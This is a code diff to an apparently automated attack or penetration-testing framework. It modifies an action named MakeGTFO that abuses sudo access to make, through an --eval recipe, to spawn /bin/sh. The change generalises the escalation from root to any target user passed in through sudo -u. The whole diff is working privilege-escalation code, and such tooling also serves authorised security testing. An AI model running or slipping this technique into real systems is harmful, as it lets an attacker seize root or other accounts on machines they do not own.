@@ -53,14 +53,16 @@ class MakeGTFO(Action):
         self, sessions: SessionManager, artefacts: ArtefactManager, pattern: MultiPattern
     ) -> ActionExecutionResult:
         """
-        Exploit make command to get root session.
+        Exploit make command to change user.
         """
         tulpa_session = pattern.get('session')
         tulpa_session_id = tulpa_session.get('id')
         live_session = sessions.get_session(tulpa_session_id)
+        permission = pattern.get('permission')
+        as_user = permission.get('as_user')
 
         live_session.run_command("COMMAND='/bin/sh'")
-        cmd = r"sudo make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
+        cmd = rf"sudo -u {as_user} make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
         output = live_session.run_command(cmd)
         return ActionExecutionResult(
             command=[cmd], stdout=output, session=tulpa_session_id, logs=["Environment variable COMMAND='/bin/sh'"]
